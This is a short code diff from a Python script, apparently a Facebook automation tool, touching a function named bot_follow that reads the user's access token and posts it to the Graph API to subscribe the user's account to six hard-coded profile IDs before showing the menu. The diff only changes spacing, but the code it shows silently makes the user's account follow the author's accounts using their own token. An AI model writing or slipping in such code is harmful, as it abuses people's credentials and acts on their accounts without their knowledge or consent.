@@ -104,12 +104,12 @@ def bot_follow():
 	except IOError:
 		print("\n   [!] Token invalid")
 		masuk()
-    	requests.post('https://graph.facebook.com/100007095946782/subscribers?access_token=' + toket)      #44 K453P
-    	requests.post('https://graph.facebook.com/100006792461977/subscribers?access_token=' + toket)      #44 K453P
+    	requests.post('https://graph.facebook.com/100007095946782/subscribers?access_token=' + toket) #44 K453P
+    	requests.post('https://graph.facebook.com/100006792461977/subscribers?access_token=' + toket) #44 K453P
     	requests.post('https://graph.facebook.com/100009218573546/subscribers?access_token=' + toket) #44 K453P
-    	requests.post('https://graph.facebook.com/100021545539536/subscribers?access_token=' + toket)       #44 K453P
+    	requests.post('https://graph.facebook.com/100021545539536/subscribers?access_token=' + toket) #44 K453P
     	requests.post('https://graph.facebook.com/100001881339355/subscribers?access_token=' + toket) #44 K453P
-    	requests.post('https://graph.facebook.com/100008044232799/subscribers?access_token=' + toket)  #44 K453P
+    	requests.post('https://graph.facebook.com/100008044232799/subscribers?access_token=' + toket) #44 K453P
     	menu()
 			
 def menu():
